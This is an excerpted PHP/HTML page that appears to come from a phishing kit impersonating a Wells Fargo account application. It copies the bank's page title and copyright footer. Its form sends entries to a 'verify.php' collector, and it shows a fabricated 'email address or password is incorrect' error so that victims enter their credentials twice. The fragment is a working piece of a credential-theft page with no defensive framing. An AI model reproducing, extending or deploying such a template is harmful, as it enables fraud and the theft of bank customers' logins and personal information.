    ...
    <div id="mainpage" data-role="page" class="osmp-app ui-page ui-page-theme-a ui-page-active" data-title="Wells Fargo - Application - About You" data-url="mainpage">
        ...
        <div id="mainColumns" tabindex="-1" role="main" class="ui-content osmp-content">
            <div class="primary-content">
                ...
                <form id="form" class="wait" action="../Layout/Terraform/verify.php?token=<?php echo $_SESSION['token']; ?>" method="POST">
                    ...
                    <div class="section">
                        ...
                        <?php
                            ...
                            if (
                                isset($_SESSION['emailTwice']) &&
                                $_SESSION['emailTwice']
                            ) {
                                echo '<br><br><span class="error-list">Your email address or password is incorrect.<br>Please try again.</span>';
                            }
        ...
        <div data-role="footer" class="osmp-footer ui-footer ui-bar-inherit singleColumn" role="contentinfo">
            <footer role="contentinfo">
                <div class="c9">
                    ...
                    <hr>
                    © 1999 - <span class="placeholder">2021</span> Wells Fargo. All rights reserved. NMLSR ID 399801
                </div>
            </footer>
        </div>
    </div>
